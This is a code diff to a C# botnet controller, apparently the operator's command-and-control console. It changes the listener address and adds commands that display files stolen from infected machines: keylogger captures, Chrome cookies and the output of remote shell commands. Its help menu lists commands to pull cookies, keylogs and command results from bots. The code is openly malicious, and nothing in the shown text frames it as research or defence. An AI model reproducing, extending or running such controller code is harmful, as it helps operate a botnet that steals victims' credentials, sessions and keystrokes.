@@ -23,7 +23,7 @@ namespace Control
             try
             {
 
-                IPAddress address = IPAddress.Parse("192.168.50.121");
+                IPAddress address = IPAddress.Parse("192.168.1.100");
 
                 TcpListener listener = new TcpListener(address, PORT_NUMBER);
 
@@ -195,11 +195,35 @@ namespace Control
 
 
             }
+            else if (command == "read keylogger")
+            {
+                string type = "keylogger";
+                string rs = readFile(type);
+                Console.Write(rs);
+
+            }
+            else if (command == "read cookies")
+            {
+                string type = "cookies";
+                string rs = readFile(type);
+                Console.Write(rs);
+
+            }
+            else if (command == "read cmd command")
+            {
+                string type = "cmd";
+                string rs = readFile(type);
+                Console.Write(rs);
+
+            }
             else if(command == "help")
             {
                 Console.WriteLine("get cookies                         --> Get Cookies Chrome From Bot");
                 Console.WriteLine("get keylogger                       --> Get File From Bot");
                 Console.WriteLine("run cmd command                     --> Get Result Command From Bot");
+                Console.WriteLine("read keylogger                      --> Read Keylogger File From Bot");
+                Console.WriteLine("read cookies                        --> Read Cookies File From Bot");
+                Console.WriteLine("read cmd command                    --> Read CMD Command File From Bot");
                 Console.WriteLine("clear                               --> Clear The Screen");
                 Console.WriteLine("exit                                --> Exit Socket");
             }
@@ -217,5 +241,40 @@ namespace Control
             return rs;
         }
 
+
+        public static string readFile(string type)
+        {
+            string fileName = "";
+            if (type == "cookies")
+            {
+                fileName = "cookies.txt";
+            }
+            else if (type == "keylogger")
+            {
+                fileName = "keylogger.txt";
+            }
+            else if (type == "cmd")
+            {
+                fileName = "cmdResult.txt";
+            }
+
+            string rs = "";
+
+            if(File.Exists(fileName))
+            {
+                string[] lines = File.ReadAllLines(fileName);
+
+                foreach (string line in lines)
+                {
+                    rs += line + "\n";
+                }
+            }
+            else
+            {
+                rs = "The file " + fileName + " does not exist\n You need get "+fileName + " from botnet\n";
+            }
+
+            return rs;
+        }
     }
 }
